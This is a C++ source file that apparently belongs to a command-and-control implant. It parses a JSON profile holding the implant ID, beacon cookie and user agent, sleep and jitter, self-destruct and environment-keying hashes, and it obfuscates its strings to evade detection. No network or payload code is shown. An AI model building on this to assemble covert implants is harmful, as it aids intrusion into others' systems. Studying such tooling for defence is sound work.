#include "profile.h"
#include "rapidjson/rapidjson.h"
#include "obfuscator/MetaString.h"

using namespace rapidjson;

template <typename ValueType>
void ReadArray(rapidjson::Value jsonArray, std::vector<ValueType>& output) {
	for (auto it = jsonArray.Begin(); it != jsonArray.End(); it++) {
		auto value = it->template Get<ValueType>();
		output.emplace_back(value);
	}
}

MalleableProfile* parseMalleableConfig(std::string configString, std::string b64PrivateKey) {
	// Read string as JSON
	Document d;
	d.Parse(configString.c_str());

	Value& config = d[OBFUSCATED("config")];

	// Create MalleableProfile struct
	MalleableProfile* profile = new MalleableProfile;

	// Parse JSON into MalleableProfile struct
	profile->implantId = d[OBFUSCATED("id")].GetString();
	profile->cookie = config[OBFUSCATED("cookie")].GetString();
	profile->userAgent = config[OBFUSCATED("user_agent")].GetString();
	profile->autoSelfDestruct = config[OBFUSCATED("auto_self_destruct")].GetBool();
	profile->sleep = config[OBFUSCATED("sleep_time")].GetInt();
	profile->jitter = config[OBFUSCATED("jitter")].GetFloat();
	profile->maxRetries = config[OBFUSCATED("max_retries")].GetInt();
	profile->retryWait = config[OBFUSCATED("retry_wait")].GetInt();
	profile->retryJitter = config[OBFUSCATED("retry_jitter")].GetFloat();
	profile->tailoringHashRounds = config[OBFUSCATED("tailoring_hash_rounds")].GetInt();
	profile->base64EncryptionKey = b64PrivateKey;
	profile->base64ServerPublicKey = config[OBFUSCATED("enc_key")].GetString();
	profile->tailoringHashFunction = config[OBFUSCATED("tailoring_hash_function")].GetString();
	profile->tailoringHashes = std::vector<std::string>();

	for (auto& m : config[OBFUSCATED("tailoring_hashes")].GetArray())
	{
		profile->tailoringHashes.push_back(m.GetString());
	}


	return profile;
}

// TODO: Not working :/
// std::ostream& operator<<(std::ostream& os, const MalleableProfile& profile) {
// 	return os << "MalleableProfile: {"
// 		<< "\n\timplantId: " << profile.implantId
// 		<< "\n\tcookie: " << profile.cookie
// 		<< "\n\tuserAgent: " << profile.userAgent
// 		<< "\n\tautoSelfDestruct: " << profile.autoSelfDestruct
// 		<< "\n\tsleep: " << profile.sleep
// 		<< "\n\tjitter: " << profile.jitter
// 		<< "\n\tmaxRetries: " << profile.maxRetries
// 		<< "\n\tretryWait: " << profile.retryWait
// 		<< "\n\tretryJitter: " << profile.retryJitter
// 		<< "\n\ttailoringHashRounds: " << profile.tailoringHashRounds
// 		<< "\n\tbase64EncryptionKey: " << profile.base64EncryptionKey
// 		<< "\n\tbase64ServerPublicKey: " << profile.base64ServerPublicKey
// 		<< "\n\ttailoringHashFunction: " << profile.tailoringHashFunction
// 		<< "\n\ttailoringHashes: ";
// 		for (auto& hash : profile.tailoringHashes) {
// 			os << "\n\t\t" << hash;
// 		}
// 		os << "\n}";
// }